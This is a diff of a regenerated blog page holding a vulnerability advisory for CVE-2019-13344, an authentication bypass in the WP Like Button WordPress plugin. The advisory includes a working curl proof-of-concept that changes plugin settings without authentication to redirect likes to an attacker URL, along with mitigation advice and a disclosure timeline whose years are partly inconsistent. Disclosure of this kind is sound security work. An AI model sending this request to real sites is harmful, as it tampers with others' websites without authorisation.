@@ -206,16 +206,16 @@ Vendor Homepage: http://www.crudlab.com<br>
 Software Link: https://wordpress.org/plugins/wp-like-button/<br>
 Version: 1.6.0<br>
 CVE : CVE-2019-13344  </p>
-<h1>1. Product &amp; Service Introduction:</h1>
+<h2>1. Product &amp; Service Introduction:</h2>
 <p>WP Like button allows you to add Facebook like button on your wordpress blog. You can also add Share button along with Like button or can add recommend button. As of now, the plugin has been downloaded 129,089 times and has 10,000+ active installs.  </p>
-<h1>2. Technical Details &amp; Description:</h1>
+<h2>2. Technical Details &amp; Description:</h2>
 <p>Authentication Bypass vulnerability in the WP Like Button (Free) plugin version 1.6.0 allows unauthenticated attackers to change the settings of the plugin. The contains() function in wp_like_button.php did not check if the current request is made by an authorized user, thus allowing any unauthenticated user to successfully update the settings of the plugin.   </p>
-<h1>3. Proof of Concept (PoC):</h1>
+<h2>3. Proof of Concept (PoC):</h2>
 <p>For example, the curl command below allows an attacker to change the each_page_url parameter to https://hijack.com. This allows the attacker to hijack Facebook likes.  </p>
 <p><code>curl -k -i --raw -X POST -d "page=facebook-like-button&amp;site_url=https%%3A%%2F%%2Flocalhost%%2Fwp&amp;display[]=1&amp;display[]=2&amp;display[]=4&amp;display[]=16&amp;mobile=1&amp;fb_app_id=&amp;fb_app_admin=&amp;kd=0&amp;fblb_default_upload_image=&amp;code_snippet=%%3C%%3Fphp+echo+fb_like_button()%%3B+%%3F%%3E&amp;beforeafter=before&amp;eachpage=url&amp;each_page_url=https://hijack.com&amp;language=en_US&amp;width=65&amp;position=center&amp;layout=box_count&amp;action=like&amp;color=light&amp;btn_size=small&amp;faces=1&amp;share=1&amp;update_fblb=" "https://localhost/wp/wp-admin/admin.php?page=facebook-like-button&amp;edit=1" -H "Content-Type: application/x-www-form-urlencoded"</code>  </p>
-<h1>4. Mitigation</h1>
+<h2>4. Mitigation</h2>
 <p>Users are advised to update to version 1.6.1 and above.  </p>
-<h1>5. Disclosure Timeline</h1>
+<h2>5. Disclosure Timeline</h2>
 <p>2019/06/24 Vendor contacted regarding vulnerability in v1.5.0 (crudlab@gmail.com)<br>
 2019/06/30 Second email sent to vendor (crudlab@gmail.com)<br>
 2019/07/02 Vendor released v1.6.0 update. Vulnerability still exists. Vendor did not acknowledge any emails.<br>
@@ -223,7 +223,7 @@ CVE : CVE-2019-13344  </p>
 2018/07/05 Public disclosure<br>
 2018/07/08 Wordpress plugins team notified. Plugin removed.<br>
 2019/07/09 Vendor released v1.6.1 update. Vulnerability fixed.  </p>
-<h1>6. Credits &amp; Authors:</h1>
+<h2>6. Credits &amp; Authors:</h2>
 <p>Benjamin Lim - [https://limbenjamin.com]  </p>
       </div><!-- .entry-content -->
       <br /><br />
@@ -280,7 +280,7 @@ CVE : CVE-2019-13344  </p>
                     <a href="../feeds/all.atom.xml">Atom Feed</a> | 
                     <a href="../sitemap.xml">Sitemap</a><br />
                     This site uses the <a href="https://github.com/limbenjamin/voce">voce</a> theme by <a href="//limbenjamin.com/">Benjamin Lim</a><br />
-                    Page generated on Sat Mar  7 22:43:40 2026<br />
+                    Page generated on Sun Mar  8 09:03:56 2026<br />
                     &copy; 2012-2026 <a href="..">Benjamin Lim</a> </div>
         </div>
       </div><!-- .site-info -->
